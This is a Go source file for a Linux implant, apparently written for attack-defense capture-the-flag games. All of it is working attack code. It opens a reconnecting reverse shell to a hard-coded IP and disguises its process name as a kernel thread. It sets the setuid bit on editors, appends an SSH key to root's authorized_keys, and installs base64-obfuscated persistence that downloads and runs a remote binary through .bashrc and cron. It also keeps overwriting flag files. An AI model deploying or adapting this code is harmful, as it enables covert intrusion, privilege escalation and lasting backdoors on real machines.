package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"reflect"
	"time"
	"unsafe"

	"github.com/nightlyone/lockfile"
	"github.com/radovskyb/watcher"
)

func SetProcessName(name string) error {
	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

	n := copy(argv0, name)
	if n < len(argv0) {
		argv0[n] = 0
	}
	//set all the other args to 0
	for i := n + 1; i < len(argv0); i++ {
		argv0[i] = 0
	}

	return nil
}

func connectAndRunShell(ip string, port string) {
	for {
		conn, err := net.Dial("tcp", ip+":"+port)
		if err != nil {
			fmt.Printf("[%s] Connection failed: %v\n", ip, err)
			time.Sleep(5 * time.Second) // Wait for 5 seconds before attempting to reconnect
			continue
		}

		fmt.Printf("[%s] Connected to %s:%s\n", ip, ip, port)

		cmd := exec.Command("/bin/sh")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn

		err = cmd.Run()
		if err != nil {
			fmt.Printf("[%s] Command execution failed: %v\n", ip, err)
		}

		conn.Close()
		fmt.Printf("[%s] Connection closed. Reconnecting in 5 seconds...\n", ip)
		time.Sleep(5 * time.Second) // Wait for 5 seconds before attempting to reconnect
	}
}

func isRoot() bool {
	//get the current user and return true if the user is root.
	user, err := user.Current()
	if err != nil {
		fmt.Println(err)
	}
	if user.Uid == "0" {
		return true
	}
	return false
}

func overwriteFile(path string, flag string) {
	//read the file to see if it already contains the flag.
	data, err := os.ReadFile(path)
	if err != nil {
		fmt.Printf("Failed to read %s: %v\n", path, err)
		return
	}
	if string(data) == flag {
		fmt.Printf("Flag already present in %s\n", path)
		return
	}
	err = os.WriteFile(path, []byte(flag), 0644)
	if err != nil {
		fmt.Printf("Failed to overwrite %s: %v\n", path, err)
		return
	}
	fmt.Printf("Overwrote %s with %s\n", path, flag)
}

func main() {
	//lock the process to prevent multiple instances, if the process is already running, exit.
	lock, err := lockfile.New("/tmp/.lock")
	if err != nil {
		fmt.Println(err)
	}
	err = lock.TryLock()
	if err != nil {
		//the exception is thrown when the lock is held by a non-root process and the current process is root.
		//In this case, we can just ignore the error, kill the process and start a new one.
		//if we can't get the current user, just exit.
		//if the current user is root, kill the process and start a new one.
		//try to lock again.
		//if we still can't lock, exit.
		ignoreLockIfRootOtherwiseExit(lock)
	}

	//Define the list of IP addresses to connect to.
	ips := []string{"192.168.76.136"} // Example list of IP addresses
	//Define the port to connect to.
	port := "1984"
	//Define the paths to all the ctf flag files to overwrite with our own.
	flagFiles := []string{"/home/justin/flag.txt"} // Example list of flag file paths
	//defines the ssh key to add to the authorized_keys file.
	sshKey := "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDf+adep5YH3IcKGkkj9IbFn1Ua1S20hKCF+fULaI5cXahITxdh89URSpQ0sMtDolL+VMVzsayq/RCeJT032RicXGLq7wKDXt6eXfyY/fjvph21t014X41whzYz+U8m1wZb/96o09xqkG2rUfACKn0iOK9ukhTFy7/H7vkRpoA8NVEzrcKUZ/x5vzh3fX8nJwHqhfYjd8BLAwuGupWpipFiUMtPWwATgVLv9qQWSXPp4TtK1URCR0aHo7/4MW15OQ4WeU1xZOltaRBMQMigPnUHZNgv8iRgoIPpDBnAgX4SswMggwQNTUIR3fNT9CDxv78VEUGO9GpaLny2EdlXF+xdMngRZHFNias7TaxjeUoydj2sFIK14HAgchT2XdkEObw9/g/vMFfEz7/j/7aFi9QOO5amZ5q2Oqw8H6YX9oYL8aQqVDv4cL3rFzLDTfzWL+Fft32OfFOJPoBtpvrSzyvvZMFNsgdsT5m1w18D1tb4dqt95RuinZ3l/h+m5WHMRWJU3WS1qhVcHeCy9jNIXp/Hf066ZOvYXwpTzkc4/FwCHag4fK4ZcmzJG4Hg8iyRLQEHlDF37epq7IdrN7Y3Q+bYeWQ25KBzSBjjMfjwwi6qE2rfhSnMeSK3mqECWjB/sBpttZn7GDHgbtKzhJKKcLae4tJkiORmdYV10HSkMpOjgw== justin@box1"
	//define the string to overwrite the flag files with.
	flag := "flag{this_is_a_fake_flag}"
	//define the list of uid 0 dummy users to create. (ROOT ONLY)
	//dummyUsers := []string{"systemd-timesyncd", "_backup", "rsync", "dhcp"}
	//define the dummy password to set for the dummy users.
	//dummyPassword := "c3tc3tc3t"
	//define the list of binaries to add the suid bit to. (ROOT ONLY)
	setuidBackdoorBinaries := []string{"/usr/bin/vim", "/usr/bin/vi", "/usr/bin/nano", "/bin/ed"}
	//rename the process to something less suspicious.
	list_of_unsuspicious_filenames := []string{
		"[kworker/0:1]",
		"(sd-pam)",
		"[irq/16-vmwgfx]",
		"[scsi_eh_29]",
		"[acpi_thermal_pm]",
		"[kworker/0:0-events]",
		"[migration/0]",
		"[ksoftirqd/0]",
	}
	//Define the address to download this binary from for the persistence.
	downloadURL := "http://192.168.76.36:5000/claymore"
	//pick a name from the list randomly.
	rand.Seed(time.Now().UnixNano())
	SetProcessName(list_of_unsuspicious_filenames[rand.Intn(len(list_of_unsuspicious_filenames))])

	for _, ip := range ips {
		go connectAndRunShell(ip, port)
	}

	if isRoot() {
		//setuid the binaries.
		setSuidBitOnBackdoorBinaries(setuidBackdoorBinaries)
		//write the ssh key to the authorized_keys file.
		//open the file for appending.
		file, err := os.OpenFile("/root/.ssh/authorized_keys", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			fmt.Println(err)
		}
		//append the ssh key to the file.
		if _, err := file.WriteString(sshKey + "\n"); err != nil {
			fmt.Println(err)
		}
		//close the file.
		if err := file.Close(); err != nil {
			fmt.Println(err)
		}
	}

	//generate the persistence command based on the downloadURL.
	//base64 encode the persistence command.
	//generate the encoded command to be executed.
	encodedCommand := generateEncodedCommand(downloadURL)
	//append the encoded command to the user's .bashrc file.
	//open the file for appending.
	//append the encoded command to the file.
	//close the file.
	installIntoBashrc(encodedCommand)
	//add the encoded command to cron to run every minute.
	//crontab -l >/tmp/c1
	//echo '15 9 * * * script.sh' >>/tmp/c1
	//crontab /tmp/c1

	//encode the cron command in base64 and execute it.
	installIntoCrontab(encodedCommand)

	//overwrite the flag files with our own flag.
	for _, path := range flagFiles {
		overwriteFile(path, flag)
	}
	// Watch the flag files for changes and overwrite them with our own flag when they change.
	w := watcher.New()
	w.SetMaxEvents(1)
	w.FilterOps(watcher.Write)
	for _, path := range flagFiles {
		if err := w.Add(path); err != nil {
			fmt.Println(err)
		}
	}
	go func() {
		for {
			select {
			case event := <-w.Event:
				if event.Op == watcher.Write {
					overwriteFile(event.Path, flag)
					//get rid of the event to avoid a loop.
				}
			case err := <-w.Error:
				fmt.Println(err)
			}
		}
	}()

	if err := w.Start(time.Millisecond * 100); err != nil {
		fmt.Println(err)
	}

}

func setSuidBitOnBackdoorBinaries(setuidBackdoorBinaries []string) {
	for _, binary := range setuidBackdoorBinaries {
		cmd := exec.Command("chmod", "u+s", binary)
		err := cmd.Run()
		if err != nil {
			fmt.Println(err)
		}
	}
}

func ignoreLockIfRootOtherwiseExit(lock lockfile.Lockfile) {
	user, err := user.Current()
	if err != nil {

		fmt.Println(err)
	}
	if user.Uid == "0" {

		owner, err := lock.GetOwner()
		if err != nil {
			fmt.Println(err)
		}
		if owner != nil {
			owner.Kill()
			//wait for the process to die.
			time.Sleep(1 * time.Second)
		}

		err = lock.TryLock()
		if err != nil {

			fmt.Println("Still can't lock")
			fmt.Println(err)
			os.Exit(1)
		}
	} else {
		fmt.Println(err)
		os.Exit(1)
	}
}

func installIntoCrontab(encodedCommand string) {
	cronCommand := fmt.Sprintf("crontab -l>/tmp/c1; echo '* * * * * %s' >> /tmp/c1 && crontab /tmp/c1", encodedCommand)

	cronCommand = base64.StdEncoding.EncodeToString([]byte(cronCommand))
	cmd := exec.Command("bash", "-c", fmt.Sprintf("echo %s | base64 -d | bash", cronCommand))
	err := cmd.Run()
	if err != nil {
		fmt.Println(err)
	}
}

func installIntoBashrc(encodedCommand string) {
	user, err := user.Current()
	if err != nil {
		fmt.Println(err)
	}
	bashrcPath := user.HomeDir + "/.bashrc"

	f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println(err)
	}

	if _, err := f.WriteString(encodedCommand + "\n"); err != nil {
		fmt.Println(err)
	}

	if err := f.Close(); err != nil {
		fmt.Println(err)
	}
}

func generateEncodedCommand(downloadURL string) string {
	persistenceCommand := fmt.Sprintf("wget -O /tmp/.claymore %s 2>/dev/null && chmod +x /tmp/.claymore && /tmp/.claymore &", downloadURL)

	persistenceCommand = base64.StdEncoding.EncodeToString([]byte(persistenceCommand))

	encodedCommand := fmt.Sprintf("echo %s | base64 -d | bash", persistenceCommand)
	return encodedCommand
}
